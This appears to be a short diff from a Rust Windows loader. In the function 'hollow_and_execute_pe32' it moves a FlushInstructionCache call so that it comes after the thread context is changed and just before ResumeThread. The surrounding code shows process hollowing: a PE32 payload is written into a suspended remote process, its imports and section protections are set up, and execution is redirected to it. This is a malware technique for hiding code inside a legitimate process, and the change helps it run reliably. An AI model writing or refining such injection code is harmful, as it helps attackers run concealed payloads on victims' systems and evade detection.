@@ -844,12 +844,6 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
     fix_iat_remote32(pi.hProcess, remote_base, nt, payload, &mut written)?;
     apply_section_protections32(pi.hProcess, remote_base, nt);
 
-    winapi::um::processthreadsapi::FlushInstructionCache(
-        pi.hProcess,
-        remote_base as *mut c_void,
-        (*nt).OptionalHeader.SizeOfImage as usize,
-    );
-
     let mut ctx: WOW64_CONTEXT = zeroed();
     ctx.ContextFlags = WOW64_CONTEXT_FULL;
     if Wow64GetThreadContext(pi.hThread, &mut ctx) == 0 {
@@ -876,6 +870,13 @@ unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
             );
         }
     }
+
+    winapi::um::processthreadsapi::FlushInstructionCache(
+        pi.hProcess,
+        remote_base as *mut c_void,
+        (*nt).OptionalHeader.SizeOfImage as usize,
+    );
+
     ResumeThread(pi.hThread);
 
     close_handle!(pi.hThread);
